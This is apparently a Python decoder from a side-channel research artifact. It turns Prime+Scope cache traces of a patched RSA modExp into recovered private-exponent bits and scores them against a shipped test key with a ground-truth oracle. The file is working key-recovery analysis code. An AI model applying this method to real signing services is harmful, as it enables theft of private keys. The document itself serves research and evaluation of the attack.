"""Self-contained decoder for the Prime+Scope traces of SELECT-patched modExp.

Recovers exponent bits from the interval between paired accesses to the
bf_logic_or cache line -- which also holds bf_rint, so the trace is both (see
README.md, "The watched line is not exclusive to `|`"). See REPORT.md sections
5.2.4 and 5.2.5.

The whole decoder is four steps, each one line of arithmetic:

  1. trim the trace to the region where signing actually happens
     (signing_window);
  2. split accesses into pairs at the long gaps between iterations, and keep
     the wider half of the pairs -- those are SELECT (wide_narrow);
  3. index the pairs by a straight line, index = round((t - t0) / P), with P
     the median spacing between pairs (loop_period, assign_indices);
  4. call the bit 1 where the pair's gap is above the median gap (decode).

It is deliberately simple rather than maximally accurate. Step 3 in
particular estimates the period well enough to keep phase over most of a
trace but not all of it, which is where most of the lost accuracy goes; see
EXPLANATION.md, "The hard part: which bit is which".

Depends only on numpy. Trace format is one line per probe record, columns
separated by whitespace, each column "tsc:latency". The current attacker probes
one line by default, so traces have a single column. Traces recorded by the
earlier two-probe attacker carry a dropped bf_add_internal column first, so the
signal is the last column (see signal_slot). Exception: traces from a
PROBE_LINE=both run put bf_logic_and last, so pass slot=0 explicitly for those.
"""
import gzip
import json
from pathlib import Path

import numpy as np

ROOT = Path(__file__).resolve().parents[1]
TRACE_DIR = ROOT / "data" / "traces"
KEY_FILE = ROOT / "victim" / "rsa_key_0.json"
# Pool keys aren't shipped in the artifact's victim/ dir (only key 0 is); when
# evaluating a locally-collected key pool this is where the other 99 live.
POOL_KEY_DIR = ROOT.parent.parent / "rsa_key_pool"

# Splits the two gap scales. Every observed gap is either < 35,000 or
# > 270,000 cycles, so this is read off the data, not tuned.
PAIR_SPLIT_CYCLES = 100_000

def signal_slot(path):
    """Column index of the bf_logic_or probe: the last one present."""
    opener = gzip.open if str(path).endswith(".gz") else open
    with opener(path, "rt") as fh:
        for line in fh:
            cols = line.split()
            if cols:
                return len(cols) - 1
    raise ValueError(f"empty trace: {path}")


def load_trace(path, slot=None):
    """Return (timestamps, latencies) for one probe slot, sorted by timestamp."""
    if slot is None:
        slot = signal_slot(path)
    opener = gzip.open if str(path).endswith(".gz") else open
    ts, lat = [], []
    with opener(path, "rt") as fh:
        for line in fh:
            cols = line.split()
            if len(cols) <= slot:
                continue
            t, _, l = cols[slot].partition(":")
            t = int(t)
            if t > 0:
                ts.append(t)
                lat.append(int(l))
    ts = np.array(ts, dtype=np.int64)
    lat = np.array(lat, dtype=np.int64)
    order = np.argsort(ts)
    return ts[order], lat[order]


def signing_window(ts, bins=40, frac=0.25):
    """Bounds of the dense region where signing occurs.

    The probe loop runs for the whole cycle budget, so the tail of the trace is
    post-signing idle. Keep histogram bins holding at least `frac` of the
    busiest bin.
    """
    hist, edges = np.histogram(ts, bins=bins)
    keep = np.where(hist >= frac * hist.max())[0]
    return edges[keep[0]], edges[keep[-1] + 1]


def wide_narrow(ts):
    """Split accesses into pairs and separate the wide and narrow groups.

    Returns (wide_start_times, wide_gaps, narrow_gaps, alternation_rate).
    """
    lo, hi = signing_window(ts)
    ts = ts[(ts >= lo) & (ts <= hi)]

    gaps = np.diff(ts)
    starts = np.concatenate(([0], np.where(gaps >= PAIR_SPLIT_CYCLES)[0] + 1))
    ends = np.concatenate((starts[1:] - 1, [len(ts) - 1]))

    exactly_two = (ends - starts) == 1
    start_t = ts[starts[exactly_two]].astype(float)
    gap = (ts[ends[exactly_two]] - ts[starts[exactly_two]]).astype(float)

    wide = gap > np.median(gap)
    alternation = float((wide[:-1] != wide[1:]).mean())
    return start_t[wide], gap[wide], gap[~wide], alternation


def loop_period(t):
    """Duration of one modExp loop iteration, in cycles.

    Every iteration emits one wide pair, so consecutive pair start times are
    one period apart wherever no iteration was missed. Missed iterations make
    some spacings 2P or 3P, which pull the mean but not the median -- so the
    median spacing is the period.
    """
    return float(np.median(np.diff(t)))


def assign_indices(t, n_bits, anchor=0):
    """Map wide-pair timestamps to exponent-bit indices.

    The model is one straight line through the pair start times,
    t = index * P + t[0], with P the median iteration time. It has to be a
    global line: counting forward from the previous pair loses a bit for every
    missed loop iteration, and about 100 of the 4094 iterations do not produce
    a clean pair (REPORT 5.2.4).

    `anchor` shifts every index by a constant. It is not determined by the
    trace: the line fixes the spacing and the phase, but which loop iteration
    the first pair belongs to is one unknown integer for the whole trace, and
    accuracy is sharply peaked in it. An attacker carries the handful of
    candidates forward rather than resolving it here.
    """
    period = loop_period(t)
    idx = np.round((t - t[0]) / period).astype(int)
    idx += anchor - idx.min()
    valid = (idx >= 0) & (idx < n_bits)
    return idx, valid, period


def best_anchor(t, wide_gap, n_bits, truth_lsb_first, span=2):
    """Pick the anchor offset, scoring candidates against the known exponent.

    Only for evaluating the artifact: it resolves the one integer the trace
    does not determine. Returns (anchor, accuracy) for the best candidate.
    This is an oracle, and stands in for what a real attacker does with the
    same handful of candidates -- try each implied key against a known
    signature, an O(span) check that needs no ground truth.
    """
    predicted = (wide_gap > np.median(wide_gap)).astype(int)
    scores = {}
    for cand in range(-span, span + 1):
        idx, valid, _ = assign_indices(t, n_bits, anchor=cand)
        if not valid.any():
            continue
        scores[cand] = float(
            (predicted[valid] == truth_lsb_first[idx[valid]]).mean())
    best = max(scores, key=scores.get)
    return best, scores[best]


def key_file(key_id=0):
    """Path to the JSON key file for key_id.

    Key 0 is shipped with the artifact (victim/rsa_key_0.json, the same key
    used by the five example traces). Other ids are looked up in the
    surrounding repository's key pool, present only when running Path B
    (collecting new traces) -- see README.md.
    """
    if key_id == 0 and KEY_FILE.exists():
        return KEY_FILE
    candidate = POOL_KEY_DIR / f"rsa_key_{key_id}.json"
    if candidate.exists():
        return candidate
    raise FileNotFoundError(
        f"no key file for key_id={key_id} (checked {KEY_FILE} and {candidate})")


def load_exponent(key_id=0):
    """Return (bits_lsb_first, bits_msb_first) for the given key's `d`."""
    key = json.loads(key_file(key_id).read_text())
    d = int(key["d"], 16)
    msb_first = np.array([int(c) for c in bin(d)[2:]], dtype=np.int64)
    return msb_first[::-1], msb_first


def decode(path, key_id=0, anchor=None):
    """Decode one trace. Returns a dict of per-trace results.

    anchor=None (the default) resolves the anchor with the ground-truth
    oracle (best_anchor). Pass an explicit integer to decode without it.
    """
    ts, _ = load_trace(path)
    lsb_first, msb_first = load_exponent(key_id)
    n_bits = len(lsb_first)

    start_t, wide_gap, narrow_gap, alternation = wide_narrow(ts)
    if anchor is None:
        anchor, _ = best_anchor(start_t, wide_gap, n_bits, lsb_first)
    idx, valid, period = assign_indices(start_t, n_bits, anchor=anchor)

    bit_index = idx[valid]
    gap = wide_gap[valid]
    predicted = (gap > np.median(gap)).astype(int)

    return {
        "name": Path(path).name.split(".")[0],
        "key_id": key_id,
        "wide_pairs": len(start_t),
        "alternation": alternation,
        "period": period,
        "anchor": anchor,
        "bit_index": bit_index,
        "gap": gap,
        "predicted": predicted,
        "truth": lsb_first[bit_index],
        "truth_forward": msb_first[bit_index],
        "wide_mean": wide_gap.mean(), "wide_std": wide_gap.std(),
        "narrow_mean": narrow_gap.mean(), "narrow_std": narrow_gap.std(),
        "n_bits": n_bits,
    }


def correlation(gap, truth):
    if gap.std() == 0 or truth.std() == 0:
        return float("nan")
    return float(np.corrcoef(gap, truth)[0, 1])


def accuracy(predicted, truth):
    return float((predicted == truth).mean())


def trace_paths():
    return sorted(TRACE_DIR.glob("r*.out*"))
